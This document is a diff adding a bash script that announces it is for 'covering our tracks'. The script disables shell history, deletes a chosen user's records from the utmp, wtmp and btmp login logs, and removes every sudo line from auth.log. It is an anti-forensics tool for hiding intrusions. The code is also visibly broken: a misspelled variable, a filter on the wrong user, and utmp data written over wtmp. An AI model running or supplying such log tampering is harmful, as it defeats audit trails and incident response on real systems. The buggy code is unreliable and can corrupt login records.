@@ -1,0 +1,77 @@
+#!/bin/bash
+## Unsetting any form of history invovled 
+unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST REMOTEHOST REMOTEUSER;export HISTSIZE=0
+
+## Creating a variable for the time this was run 
+date=$(date +%s)
+## Creating our variables for what name is to be cleared
+echo -n "Hello there, today we will be covering our tracks shhhhhh. 
+Do you want to clear your user's tracks or a specific user? 
+Press 1 for your user or 2 for a different user: "
+read input1
+case "$input1" in
+	(1) user=$(whoami)
+		#TEST echo $user
+		;;
+	(2) echo "Please insert the name of the user you wish to clear: "
+		read customuser 
+		#TEST echo $customuser
+		;;
+esac
+
+#Determining user choice to set a variable for easier use later(STILL BROKEN)
+if [ ! -n "$user" ] 
+then 
+	clearuser=$customeruser
+else
+	clearuser=$user
+fi
+echo $clearuser
+echo $customeruser
+echo $user
+#Grab user choice for what to do
+echo "What shall we do? 
+1: Hide user logged in(/var/log/utmp)
+2: Hide the fact user logged in(var/log/wtmp)
+3: Hide failed login attempts(/var/run/btmp)
+"
+read input2
+case "$input2" in
+	(1) utmpdump /var/run/utmp > /dev/shm/.1og 2>/dev/null
+	        utmpdump /var/run/utmp | grep -v "$user" > /dev/shm/.1 2 2>/dev/null
+	        utmpdump -r < /dev/shm/.1 > /var/run/wtmp 2>/dev/null
+		#test echo "1"
+		;;
+	(2) utmpdump /var/log/wtmp > /dev/shm/.2og 2>/dev/null
+		utmpdump /var/log/wtmp | grep -v "$user" > /dev/shm/.2 2>/dev/null
+		utmpdump -r < /dev/shm/.2 > /var/log/wtmp 2>/dev/null
+		#test echo "2"
+		;;
+	(3) utmpdump /var/log/btmp > /dev/shm/.3 2>/dev/null
+		utmpdump /var/log/btmp | grep -v "$user" > /dev/shm/.3 2>/dev/null
+		utmpdump -r < /dev/shm/.3 > /var/log/btmp 2>/dev/null
+		#test echo "3"
+		;;
+esac
+
+echo "Are you ready to clean up and do not require the original files anymore?(1 Yes 2 No): "
+read input3
+case "$input3" in
+	(1) #clearing files we made
+		rm -f /dev/shm/.1 
+		rm -f /dev/shm/.1og
+		rm -f /dev/shm/.2
+		rm -f /dev/shm/.2og
+		rm -f /dev/shm/.3
+		rm -f /dev/shm/.3og
+	     #clearing logs we made
+	     
+	     #Auth log for sudo
+	     cat /var/log/auth.log | grep -v "sudo" > /dev/shm/.4
+	     cat /dev/shm/.4 > /var/log/auth.log
+	     rm -f /dev/shm/.4
+             
+		;;
+	(2) echo "Hurry up loser"
+		;;
+esac
